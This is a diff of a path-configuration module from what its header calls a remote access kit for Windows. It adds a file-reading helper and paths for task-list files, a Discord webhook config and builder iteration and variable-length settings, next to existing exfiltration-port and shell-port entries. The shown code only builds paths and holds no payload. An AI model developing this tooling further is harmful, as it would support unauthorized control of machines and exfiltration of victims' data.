@@ -10,16 +10,26 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.0
+# Build:  1.0.1
 # -------------------------------------------------------------
 import os
+
 #Needed local logging utilitys function due to circular import error with logging.py
 class LoggingUtilitys:
 
+    #Function will return string from cwd + input parameter
     def get_misc_file_path_str(self, file_path_from_working_dir):
         current_dir = os.path.join(os.getcwd())
         target_file_path = str(f'{current_dir}/{file_path_from_working_dir}')
         return target_file_path
+
+    #Function will read a file and return the string data
+    def retrieve_file_data(self,file_path):
+        with open(file_path,'r') as file:               #Open file
+            data = file.read()                          #Read & store data in var
+            file.close()                                #Close the file
+        return data                                     #Return file contents
+
 
 #Data storage file paths
 class DSFilePath:
@@ -30,6 +40,9 @@ class DSFilePath:
         self.active_connections_file = LoggingUtilitys().get_misc_file_path_str('data_storage/console_window/active_connections.txt')
         self.bits_file = LoggingUtilitys().get_misc_file_path_str('data_storage/console_window/bits.txt')
         self.listening_sockets_file = LoggingUtilitys().get_misc_file_path_str('data_storage/console_window/listening.txt')
+        self.task_manager_file = LoggingUtilitys().get_misc_file_path_str('data_storage/sysinfo_window/task_list.txt')
+        self.task_manager_csv = LoggingUtilitys().get_misc_file_path_str('data_storage/sysinfo_window/task_list.csv')
+        self.job_file = LoggingUtilitys().get_misc_file_path_str('data_storage/sysinfo_window/job.txt')
 
 #Config file paths
 class CFGFilePath:
@@ -42,6 +55,10 @@ class CFGFilePath:
         self.exfil_port_file = LoggingUtilitys().get_misc_file_path_str('configs/networking/exfil_port.txt')
         self.shells_lport_file = LoggingUtilitys().get_misc_file_path_str('configs/shells/lport.txt')
         self.stream_port_file = LoggingUtilitys().get_misc_file_path_str('configs/networking/stream_port.txt')
+        self.discord_webhook = LoggingUtilitys().get_misc_file_path_str('configs/discord/channel.txt')
+        self.discord_setting = LoggingUtilitys().get_misc_file_path_str('configs/discord/setting.txt')
+        self.iterations_file = LoggingUtilitys().get_misc_file_path_str('configs/builder/iterations.txt')
+        self.var_len_file = LoggingUtilitys().get_misc_file_path_str('configs/builder/variable_length.txt')
 
 #Background filepaths
 class BGPath:
@@ -50,6 +67,8 @@ class BGPath:
         self.main_window_bg = LoggingUtilitys().get_misc_file_path_str('core/Qt5/img/main_tab_background.jpg')
         self.cheap_loic_lol = LoggingUtilitys().get_misc_file_path_str('core/Qt5/img/Listener.jpeg')
         self.settings_window_bg = LoggingUtilitys().get_misc_file_path_str('core/Qt5/img/settings_background.jpg')
+        self.black_box = LoggingUtilitys().get_misc_file_path_str('core/Qt5/img/blackbox.jpeg')
+        self.task_man_bg = LoggingUtilitys().get_misc_file_path_str('core/Qt5/img/task_man_bg.jpg')
 
 #Builder related file/dir paths
 class BuilderPath:
